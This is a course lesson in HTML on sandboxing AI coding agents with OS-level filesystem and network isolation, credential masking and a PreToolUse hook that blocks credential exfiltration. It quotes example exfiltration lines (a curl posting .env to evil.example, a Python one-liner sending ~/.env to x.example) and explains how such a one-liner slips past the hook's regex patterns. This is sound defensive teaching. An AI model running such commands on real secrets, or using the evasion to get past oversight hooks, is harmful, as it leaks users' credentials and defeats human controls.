@@ -1,0 +1,408 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Sandboxes and hooks - AI Software Developer</title>
+<meta name="description" content="A rule the model can talk its way past is a suggestion. The operating system enforces a boundary on every child process, and a hook is the deterministic rule you write yourself.">
+<link rel="stylesheet" href="../../assets/hub.css">
+<script src="https://cdn.jsdelivr.net/npm/mermaid@11/dist/mermaid.min.js"></script>
+<script src="../../assets/hub.js"></script>
+<script src="../outline.js"></script>
+</head>
+<body>
+<nav class="spine"><div class="spine-inner">
+  <a class="home" href="../index.html">AI SOFTWARE DEVELOPER</a>
+  <a class="hide-sm" href="../index.html">Course map</a>
+  <a class="hide-sm" href="../reference/glossary.html">Glossary</a>
+  <a href="../../index.html">Course Hub</a>
+  <span class="sp"></span>
+</div></nav>
+
+<main class="wrap">
+  <div class="eyebrow">Module 07 &middot; Security &middot; Lesson 0740</div>
+  <h1>The boundary the model cannot talk its way past</h1>
+  <p class="paper-meta">
+    <span class="pill med">working</span>
+    <span class="pill">10 min</span>
+    Written against the published sandboxing and hooks references, as one worked instance of the mechanism.
+    &middot; <a href="https://code.claude.com/docs/en/sandboxing">Configure the sandboxed Bash tool</a>
+  </p>
+
+  <div class="card tldr">
+    <h2 class="h-label">The one-minute version</h2>
+    <ul>
+      <li>A permission rule matches a <b>command string</b>. A sandbox is enforced by the operating system on <b>every command and its child processes</b>.</li>
+      <li>Filesystem isolation is <code>denyRead</code> plus a narrower <code>allowRead</code>, and where two rules overlap <b>the more specific path wins</b>.</li>
+      <li>Network isolation is a <b>domain allowlist</b>. Credentials can be denied outright or <b>masked</b>, so the request authenticates and the agent never holds the value.</li>
+      <li>A tighter boundary buys <b>fewer prompts</b>, not more: in auto-allow mode a sandboxable command simply runs.</li>
+      <li>A <code>PreToolUse</code> hook is a program that reads the tool call as JSON and returns a decision. It is <b>deterministic where the classifier is probabilistic</b> - and it reads only what it is given.</li>
+    </ul>
+  </div>
+
+  <figure class="diagram">
+    <div class="fig-cap">Where this sits</div>
+    <div class="fig-claim">Rules stop at the command string, and everything past it lives here.</div>
+    <div class="mermaid">
+flowchart LR
+  P["What came before&lt;br/&gt;modes, rules, and a documented gap"] --> T["THIS PAGE&lt;br/&gt;the kernel, and your own hook"]
+  T --> N["What it enables&lt;br/&gt;an unattended agent you can defend"]
+  W["Module 07&lt;br/&gt;cut a leg, at the layer that holds"] -.- T
+    </div>
+    <figcaption>The previous page ended on a documented limit: file rules do not reach a subprocess that opens files itself. This page is where that hole is closed, and it is closed twice - once by the operating system and once by a program you write.
+    <b>The last lesson gave you a policy; this one gives you something that enforces it.</b></figcaption>
+  </figure>
+
+  <h2 id="os">1. What "OS-level" actually buys</h2>
+  <p>The sandbox is not a wrapper around the agent's own tools. It is a boundary the operating system applies to <b>every Bash command and its child processes</b>, which is precisely the set that a string-matching rule cannot see into. On macOS it uses the built-in Seatbelt framework. On Linux and WSL2 it rests on <a href="https://github.com/containers/bubblewrap">bubblewrap</a> for filesystem isolation and <code>socat</code>, with an optional seccomp filter that adds Unix-domain-socket blocking.</p>
+  <p>The distinction is the whole lesson, so it is worth drawing rather than describing.</p>
+
+  <figure class="diagram">
+    <div class="fig-cap">Where each control applies</div>
+    <div class="fig-claim">A rule inspects the first process; the sandbox contains every one below it.</div>
+    <svg class="chart" viewBox="0 0 640 300" role="img" aria-label="A process tree with the agent at the top, a bash command below it, and three child processes below that - a python interpreter, a node script and a network client. The bash command is highlighted and labelled to the right as the only thing a permission rule reads. A sandbox boundary is drawn around the bash command and all three of its children, and two arrows leaving that boundary end at destinations drawn as refused - the home directory and any host.">
+      <rect class="d-box" x="230" y="24" width="180" height="34" rx="4"/>
+      <text class="lbl-b" x="320" y="46" text-anchor="middle">the agent</text>
+
+      <path class="d-flow" d="M320 60 L320 88"/>
+      <rect class="d-focus" x="230" y="90" width="180" height="34" rx="4"/>
+      <text class="d-mono" x="320" y="112" text-anchor="middle">bash: python build.py</text>
+      <text class="d-mono" x="500" y="104">a rule reads</text>
+      <text class="d-mono" x="500" y="120">this line only</text>
+
+      <rect class="d-bound" x="150" y="78" width="340" height="150" rx="8"/>
+      <text class="d-mono" x="158" y="72">the sandbox boundary</text>
+
+      <path class="d-flow" d="M320 126 L230 158"/>
+      <path class="d-flow" d="M320 126 L320 158"/>
+      <path class="d-flow" d="M320 126 L412 158"/>
+      <rect class="d-box" x="166" y="160" width="112" height="34" rx="4"/>
+      <text class="d-mono" x="222" y="182" text-anchor="middle">open(&quot;~/.aws&quot;)</text>
+      <rect class="d-box" x="288" y="160" width="70" height="34" rx="4"/>
+      <text class="d-mono" x="323" y="182" text-anchor="middle">node</text>
+      <rect class="d-box" x="368" y="160" width="112" height="34" rx="4"/>
+      <text class="d-mono" x="424" y="182" text-anchor="middle">socket.send()</text>
+
+      <path class="d-flow s-alarm" d="M200 196 L150 236"/>
+      <rect class="d-drop" x="34" y="234" width="120" height="30" rx="4"/>
+      <text class="d-mono" x="94" y="254" text-anchor="middle">home directory</text>
+      <path class="d-flow s-alarm" d="M446 196 L502 236"/>
+      <rect class="d-drop" x="486" y="234" width="120" height="30" rx="4"/>
+      <text class="d-mono" x="546" y="254" text-anchor="middle">any host</text>
+
+      <text class="read" x="320" y="288" text-anchor="middle">The rule saw one line of text. The kernel saw three processes and two attempts to leave.</text>
+    </svg>
+    <figcaption>The three boxes inside the boundary are children the agent never named and a permission rule never sees. The two arrows leaving the boundary are the two legs of the trifecta, ending at destinations the kernel refuses.
+    <b>A control that reads a command string can only ever be as good as the command string was honest.</b></figcaption>
+  </figure>
+
+  <h2 id="filesystem">2. Filesystem: deny wide, allow narrow</h2>
+  <p>Sandboxed commands can write to the working directory and any directories you added, and <code>allowWrite</code> extends that for tools such as a package manager or a cluster client that insist on a cache in your home directory. The interesting direction is reading, because that is the private-data leg.</p>
+  <p>The resolution rule is the one to remember: <b>when read rules overlap, the more specific path wins.</b> That holds in both directions, which is what makes the pair safe to reason about. <code>denyRead: ["~/"]</code> with <code>allowRead: ["~/projects"]</code> reopens exactly that subtree. <code>allowRead: ["~/"]</code> with <code>denyRead: ["~/**/.env"]</code> keeps every <code>.env</code> blocked while the rest of the home directory stays readable - so a broad allow written later cannot silently re-expose a secret.</p>
+
+  <div class="code-cap">.claude/settings.json &middot; ours, written against the documented sandbox keys &middot; hub content, CC BY 4.0 &middot; reproduce freely</div>
+  <pre><code class="language-json">{
+  "sandbox": {
+    "enabled": true,
+    "filesystem": {
+      "denyRead": ["~/"],
+      "allowRead": ["."],
+      "allowWrite": ["/tmp/build"]
+    },
+    "network": {
+      "allowedDomains": ["registry.npmjs.org", "*.github.com"]
+    },
+    "credentials": {
+      "files": [
+        { "path": "~/.aws/credentials", "mode": "deny" },
+        { "path": "~/.ssh", "mode": "deny" }
+      ],
+      "envVars": [
+        { "name": "GITHUB_TOKEN", "mode": "deny" }
+      ]
+    }
+  }
+}
+</code></pre>
+
+  <p>One detail decides whether that file works: the relative <code>.</code> in <code>allowRead</code> resolves against the settings file that carries it. In project settings it means the project; in user settings it would mean <code>~/.claude</code>, and every project file would stay blocked by the <code>denyRead</code> above it. A path-relative rule in the wrong file is a policy that looks right and reads nothing.</p>
+
+  <h2 id="network">3. Network: an allowlist, and a credential the agent never sees</h2>
+  <p>Network isolation is a list of domains a sandboxed command may reach. Everything else is refused at the boundary rather than argued about in the context. That is the egress leg gone, and the empty list is a legitimate setting for a project whose build does not need the network.</p>
+  <p>The more interesting mode is masking. A credential set to <code>"mode": "mask"</code> is replaced, for sandboxed commands, by a per-session sentinel value, and the sandbox proxy substitutes the real value only on connections to the hosts named in <code>injectHosts</code>. The published consequence is worth reading twice: the command and anything it logs never hold the real credential, and its requests still authenticate.</p>
+
+  <div class="code-cap">.claude/settings.json &middot; ours, written against the documented credential-masking keys &middot; hub content, CC BY 4.0 &middot; reproduce freely</div>
+  <pre><code class="language-json">{
+  "sandbox": {
+    "enabled": true,
+    "network": {
+      "tlsTerminate": {},
+      "allowedDomains": ["api.github.com", "registry.npmjs.org"]
+    },
+    "credentials": {
+      "envVars": [
+        { "name": "GH_TOKEN", "mode": "mask", "injectHosts": ["api.github.com"] },
+        { "name": "NPM_TOKEN", "mode": "mask" }
+      ]
+    }
+  }
+}
+</code></pre>
+
+  <p>Note the coupling, because it is the part that catches people: the proxy injects only on connections the domain allowlist already admits, so every <code>injectHosts</code> entry has to be reachable through <code>allowedDomains</code> as well. A masked token pointed at a host you never allowed is a token that never arrives anywhere.</p>
+
+  <div class="callout"><span class="tag">The counter-intuitive part</span>
+    Tightening the boundary reduces interruptions. In auto-allow mode a command that can be sandboxed simply runs, and only commands that fall outside the boundary - a host you did not allow, for instance - go back through the ordinary permission flow. Explicit deny rules are still respected, and an ask rule that names a command still prompts. So the trade is not safety against convenience; it is a boundary you defined once against a prompt you answer forty times.</div>
+
+  <h2 id="hooks">4. A hook is your own rule, and it is deterministic</h2>
+  <p>The sandbox enforces where processes may reach. A <code>PreToolUse</code> hook decides whether a specific call happens at all, and it is an ordinary program: it receives the tool call as JSON on standard input, and it either exits 0 saying nothing, exits 2 to block with a message on stderr, or writes a decision object on stdout.</p>
+
+  <figure class="diagram">
+    <div class="fig-cap">A hook in the turn</div>
+    <div class="fig-claim">The hook runs between the model asking and the machine acting.</div>
+    <div class="mermaid">
+sequenceDiagram
+  participant M as The model
+  participant H as Your harness
+  participant K as Your hook program
+  participant OS as The machine
+  M-->>H: proposes Bash - curl the env file to a remote host
+  H->>K: the whole tool call, as JSON on stdin
+  Note over K: an ordinary program - grep, jq, anything
+  K-->>H: permissionDecision deny, with a reason
+  H-->>M: the call was denied, and why
+  Note over M,OS: nothing reached the machine at all
+  M-->>H: proposes something else
+    </div>
+    <figcaption>Compare this with the classifier, which reviews an action by judgement. A hook gives the same answer every time for the same input, which is what makes it reviewable - and what makes it a poor judge of anything subtle.
+    <b>Determinism is the whole value: a hook you can read is a rule your team can argue about in a pull request.</b></figcaption>
+  </figure>
+
+  <p>The documentation's own example is a destructive-command guard, and it is the right shape to copy: a matcher in settings, a script beside it, and a decision object.</p>
+
+  <div class="code-cap">.claude/settings.json &middot; code.claude.com/docs/en/hooks &middot; documentation example &middot; quoted with attribution</div>
+  <pre><code class="language-json">{
+  "hooks": {
+    "PreToolUse": [
+      {
+        "matcher": "Bash",
+        "hooks": [
+          {
+            "type": "command",
+            "if": "Bash(rm *)",
+            "command": "${CLAUDE_PROJECT_DIR}/.claude/hooks/block-rm.sh",
+            "args": []
+          }
+        ]
+      }
+    ]
+  }
+}
+</code></pre>
+
+  <p>Our own version guards the exfiltration path rather than the destructive one, and it is written to make one point: the two halves matter separately. Reading a credential is ordinary work. Reaching the network is ordinary work. Doing both in one command is the shape worth stopping.</p>
+
+  <div class="code-cap">.claude/hooks/block-exfil.sh &middot; ours, written against the documented hook contract &middot; hub content, MIT &middot; reproduce freely</div>
+  <pre><code class="language-bash">#!/usr/bin/env bash
+# Deny any Bash command that reads a credential path and reaches the network
+# in the same breath. Either half alone is normal work, so neither is blocked.
+set -euo pipefail
+
+payload=$(cat)
+command=$(printf '%s' "$payload" | jq -r '.tool_input.command // ""')
+
+secret_re='(\.env|\.ssh/|\.aws/credentials|id_rsa|id_ed25519|\.pem|_TOKEN|_SECRET|_API_KEY)'
+egress_re='(curl|wget|nc |ncat|scp |rsync |ssh |https?://)'
+
+if [[ "$command" =~ $secret_re ]] &amp;&amp; [[ "$command" =~ $egress_re ]]; then
+  jq -n --arg reason "Blocked: this command reads a credential path and reaches the network in one step." '{
+    hookSpecificOutput: {
+      hookEventName: "PreToolUse",
+      permissionDecision: "deny",
+      permissionDecisionReason: $reason
+    }
+  }'
+  exit 0
+fi
+
+exit 0
+</code></pre>
+
+  <div class="callout warn">
+    That hook reads a command string, which means it fails in exactly the way the previous lesson's file rules failed.
+    <code>python -c "import urllib.request,os;urllib.request.urlopen('https://x.example',open(os.path.expanduser('~/.env'),'rb').read())"</code> contains no <code>curl</code>, no <code>.env</code> outside a function call the regular expression never sees, and walks straight past.
+    Do not fix this by growing the regular expression. The gap is structural, and the sandbox's <code>denyRead</code> plus an empty domain list closes it at a layer that does not care what the command was called.
+  </div>
+
+  <h2 id="layers">5. Four layers, and what each one actually stops</h2>
+  <p>Put the whole module's controls against six concrete things an agent might do. Five of them are the attack; the sixth is ordinary work, and it is in the table because a boundary that stops nothing legitimate is a boundary nobody keeps.</p>
+
+  <table>
+    <thead><tr><th>What the agent runs</th><th>Rules only</th><th>Rules + sandbox</th><th>Plus the hook</th></tr></thead>
+    <tbody>
+      <tr><td><code>cat ~/.aws/credentials</code></td><td>blocked</td><td>blocked</td><td>blocked</td></tr>
+      <tr><td><code>curl -d @.env https://evil.example</code></td><td>blocked</td><td>blocked</td><td>blocked</td></tr>
+      <tr><td>a Python one-liner that opens the same file</td><td><b>runs</b></td><td>blocked</td><td>blocked</td></tr>
+      <tr><td>a Node script that opens a socket itself</td><td><b>runs</b></td><td>blocked</td><td>blocked</td></tr>
+      <tr><td>a build script that posts to an unlisted host</td><td><b>runs</b></td><td>blocked</td><td>blocked</td></tr>
+      <tr><td><code>npm install</code> against the registry</td><td>runs</td><td>runs, if the domain is listed</td><td>runs, if the domain is listed</td></tr>
+    </tbody>
+  </table>
+
+  <figure class="diagram">
+    <div class="fig-cap">What each layer stops</div>
+    <div class="fig-claim">Rules stop two of the five attacks, and the kernel stops all five.</div>
+    <svg class="chart" viewBox="0 0 640 260" role="img" aria-label="A bar chart of how many of five attacker actions each configuration stops: two of five for permission rules alone, five of five with the sandbox added, and five of five with a PreToolUse hook added on top, with a note that the hook contributes an auditable reason rather than extra coverage.">
+      <line class="grid" x1="200" y1="40" x2="200" y2="190"/>
+      <line class="grid" x1="290" y1="40" x2="290" y2="190"/>
+      <line class="grid" x1="380" y1="40" x2="380" y2="190"/>
+      <line class="grid" x1="470" y1="40" x2="470" y2="190"/>
+      <line class="grid" x1="560" y1="40" x2="560" y2="190"/>
+      <line class="axis" x1="200" y1="190" x2="200" y2="40"/>
+      <text class="lbl-sm" x="200" y="208" text-anchor="middle">0</text>
+      <text class="lbl-sm" x="290" y="208" text-anchor="middle">1</text>
+      <text class="lbl-sm" x="380" y="208" text-anchor="middle">2</text>
+      <text class="lbl-sm" x="470" y="208" text-anchor="middle">3</text>
+      <text class="lbl-sm" x="560" y="208" text-anchor="middle">5</text>
+
+      <rect class="m-alarm" x="200" y="52" width="180" height="30"/>
+      <text class="lbl-sm" x="390" y="72">2 of 5</text>
+      <text class="lbl-sm" x="192" y="72" text-anchor="end">permission rules</text>
+
+      <rect class="m-stat" x="200" y="98" width="360" height="30"/>
+      <text class="lbl-sm" x="570" y="118">5 of 5</text>
+      <text class="lbl-sm" x="192" y="118" text-anchor="end">plus the sandbox</text>
+
+      <rect class="m-stat" x="200" y="144" width="360" height="30"/>
+      <text class="lbl-sm" x="570" y="164">5 of 5</text>
+      <text class="lbl-sm" x="192" y="164" text-anchor="end">plus the hook</text>
+
+      <text class="read" x="320" y="238" text-anchor="middle">The hook adds no coverage here. It adds a reason you wrote, in a log you can read.</text>
+      <text class="ttl" x="20" y="26">attacker actions stopped, from the six-row table above</text>
+    </svg>
+    <div class="chart-legend"><span><i class="sw-alarm"></i>string matching only</span><span><i class="sw-stat"></i>enforced by the operating system</span></div>
+    <figcaption>Counted from the table directly above, over its first five rows, and every verdict there follows from documented behaviour rather than from a benchmark. The third bar is deliberately equal to the second: a hook is not a wider net.
+    <b>Add a hook for the rules only you have, and add the sandbox for the ones physics should enforce.</b></figcaption>
+  </figure>
+
+  <h2 id="score">6. Score your own setup</h2>
+  <p>The three legs are configuration keys now, so the question "is my agent exploitable" has an answer you can work out in a minute. Answer for the machine you actually use, not the one in the documentation.</p>
+
+  <figure class="diagram scorecard" id="trifecta-check" data-bands="0.5 0.8" data-band-names="all three legs open|one leg cut|no path out">
+    <div class="fig-cap">Is there a path out</div>
+    <div class="fig-claim">Cutting any single leg ends the path, whatever the payload says.</div>
+
+    <ol class="score-rows">
+      <li class="score-row" data-weight="3">
+        <span class="score-q">Can a command the agent runs read files outside the project - your home directory, your keys, another repository?</span>
+        <span class="score-opts">
+          <label><input type="radio" name="tf-1" value="0"> anything I can read</label>
+          <label><input type="radio" name="tf-1" value="1"> some paths denied by rule</label>
+          <label><input type="radio" name="tf-1" value="2"> confined by the sandbox</label>
+        </span>
+        <span class="score-fix">Set <code>denyRead: ["~/"]</code> with <code>allowRead: ["."]</code> in <b>project</b> settings, so the relative path resolves to the project.</span>
+      </li>
+      <li class="score-row" data-weight="2">
+        <span class="score-q">Does text somebody outside your team wrote reach the context - issue bodies, fetched pages, third-party tool descriptions?</span>
+        <span class="score-opts">
+          <label><input type="radio" name="tf-2" value="0"> routinely, and unreviewed</label>
+          <label><input type="radio" name="tf-2" value="1"> only from reviewed sources</label>
+          <label><input type="radio" name="tf-2" value="2"> not in this configuration</label>
+        </span>
+        <span class="score-fix">Deny <code>WebFetch</code> and <code>WebSearch</code>, and remove every MCP server you are not actively using this week.</span>
+      </li>
+      <li class="score-row" data-weight="3">
+        <span class="score-q">Can a process the agent starts reach a host of its choosing?</span>
+        <span class="score-opts">
+          <label><input type="radio" name="tf-3" value="0"> the whole internet</label>
+          <label><input type="radio" name="tf-3" value="1"> network tools denied by rule</label>
+          <label><input type="radio" name="tf-3" value="2"> a domain allowlist at the kernel</label>
+        </span>
+        <span class="score-fix">Set <code>network.allowedDomains</code> to the hosts your build genuinely needs, and nothing else. An empty list is a legitimate answer.</span>
+      </li>
+      <li class="score-row" data-weight="2">
+        <span class="score-q">Where is your policy enforced - in words the model reads, in rules, or in the operating system?</span>
+        <span class="score-opts">
+          <label><input type="radio" name="tf-4" value="0"> a paragraph in an instruction file</label>
+          <label><input type="radio" name="tf-4" value="1"> permission rules, checked in</label>
+          <label><input type="radio" name="tf-4" value="2"> rules plus sandbox, checked in</label>
+        </span>
+        <span class="score-fix">Move each line of the paragraph to the layer that can enforce it, and delete the ones that turn out to be untestable.</span>
+      </li>
+    </ol>
+
+    <div class="build-readout">
+      <span>score <b data-score-out="points">0</b> of <b data-score-out="max">20</b></span>
+      <span><b data-score-out="band">all three legs open</b></span>
+    </div>
+    <figcaption>The fixes are the teaching, not the number - each one is a line in a file you already have. A score in the middle band is the normal, defensible place to be, because the last leg is usually the one your build depends on.
+    <b>You are not trying to reach twenty; you are trying to be able to name which leg you cut and why.</b></figcaption>
+  </figure>
+
+  <h2>Check yourself</h2>
+  <div class="quiz">
+    <h3 class="h-label">Retrieval practice</h3>
+    <p class="note-sm">Answer from memory before revealing.</p>
+
+    <div class="q" data-answer="2">
+      <div class="q-stem">You set <code>denyRead: ["~/"]</code> and <code>allowRead: ["."]</code> in your <b>user</b> settings file. What happens to your project files?</div>
+      <button class="q-opt">They are readable - a project is always allowed</button>
+      <button class="q-opt">They are readable, since allow beats deny always</button>
+      <button class="q-opt">They stay blocked - the dot resolves elsewhere</button>
+      <button class="q-opt">The sandbox refuses to start with the two rules</button>
+      <div class="q-fb">A relative path resolves against the settings file that carries it, so in user settings the dot is the user settings directory and the project never gets re-opened by the narrower allow. The first option invents an exemption the sandbox does not have. The second inverts the documented resolution, which is that the more specific path wins in either direction, not that allow always wins. The fourth expects a validation error for a configuration that is perfectly well formed and merely wrong.</div>
+    </div>
+
+    <div class="q" data-answer="3">
+      <div class="q-stem">Which statement about a <code>PreToolUse</code> hook is true?</div>
+      <button class="q-opt">It runs after the tool, so it can undo the result</button>
+      <button class="q-opt">It replaces the permission rules for that tool call</button>
+      <button class="q-opt">It reads the process tree the command will create</button>
+      <button class="q-opt">It reads the call as JSON and returns a fixed verdict</button>
+      <div class="q-fb">The hook receives the tool call - name and input - on standard input and returns a decision, and the same input always produces the same decision, which is exactly what distinguishes it from a classifier. The first describes a post-tool hook and a rollback that does not exist. The second is wrong in a way worth knowing: a hook adds a decision point, and your deny rules still apply. The third is the sandbox's job and not the hook's, which is why the two are on the same page.</div>
+    </div>
+  </div>
+
+  <h2>Practice <span class="note-sm">about 30 minutes, with a terminal</span></h2>
+
+  <div class="practice">
+    <div class="p-head"><span class="tag">Practice 1</span><span class="pill med">working</span></div>
+
+    <div class="p-stem">
+      <p>Prove to yourself that a hook is not a boundary, then build one.</p>
+      <ol>
+        <li>Put a dummy secret in a file the agent can reach, and install the exfiltration hook above.</li>
+        <li>Ask your agent to <code>curl</code> that file to a request-inspection endpoint. <b>Record the denial reason it reports.</b></li>
+        <li>Now ask it to do the same thing with a two-line Python script instead. <b>Record what happens.</b></li>
+        <li>Turn on the sandbox with <code>denyRead</code> covering the secret's directory and an empty <code>allowedDomains</code>, and repeat step 3. <b>Record the exact violation message.</b></li>
+      </ol>
+      <p>Keep the two transcripts side by side. That pair is the evidence for every claim on this page.</p>
+    </div>
+
+    <details class="hint"><summary>Hint</summary>
+      <p>Use a dummy value, not a real credential, and a request bin you control. If step 3 fails, your hook is matching something it should not - check whether the interpreter name itself is tripping the egress pattern.</p></details>
+
+    <details class="solution"><summary>Show what the four steps should produce</summary>
+      <ol class="worked">
+        <li><b>Step 2 denies, with your own sentence.</b> The reason string you wrote in the hook is what the model is told, which is why writing a useful reason matters: a denial that explains itself changes what the agent tries next.</li>
+        <li><b>Step 3 succeeds.</b> This is the point of the exercise. The command contains no <code>curl</code> and no bare path, so the regular expression sees nothing, and no amount of extra patterns fixes the class - the next spelling is always one edit away.</li>
+        <li><b>Step 4 fails at the operating system.</b> The message names a filesystem or network violation rather than a policy decision, because nothing in the agent decided anything: the read or the connect simply returned an error to the child process.</li>
+        <li><b>Keep the hook anyway.</b> It is still the only layer that can encode a rule specific to you, and its denial reason is the one a reader of the transcript can understand.</li>
+      </ol>
+      <p class="p-check"><b>Sanity check.</b> Step 3 must succeed and step 4 must fail. If step 3 fails, your hook is over-broad and you have not seen the gap; if step 4 succeeds, the sandbox is not actually enabled - check that the settings file carrying the relative <code>allowRead</code> is the project one.</p></details>
+  </div>
+
+  <div class="teacher-note"><b>Your teacher.</b> Ask your agent to write three commands that read a file in your home directory without the string <code>~</code> or the file's name appearing in the command. It will produce them in seconds, and reading them is the fastest cure for the belief that a pattern on a command string is a security boundary.</div>
+
+  <h2 class="h-label">Primary source to go deeper</h2>
+  <p>The sandboxing reference carries what this page compressed: the Linux dependency list, the overlap table in full, the fallback behaviour when masking cannot be applied, and how sandboxing interacts with each permission mode: <a href="https://code.claude.com/docs/en/sandboxing">Configure the sandboxed Bash tool</a>. Read <a href="https://code.claude.com/docs/en/hooks">the hooks reference</a> beside it for the full event list and the JSON each event carries.</p>
+
+  <div class="pager">
+    <a href="0730-permissions-are-the-defence.html"><span class="dir">&larr; Previous</span><span class="ttl">Permissions are the defence</span></a>
+    <a class="nxt" href="0750-scanners-in-ci.html"><span class="dir">Next &rarr;</span><span class="ttl">Scanners in CI</span></a>
+  </div>
+
+  <footer><p>AI Software Developer &middot; Lesson 0740 &middot; <a href="../reference/glossary.html">Glossary</a></p></footer>
+</main>
+</body>
+</html>
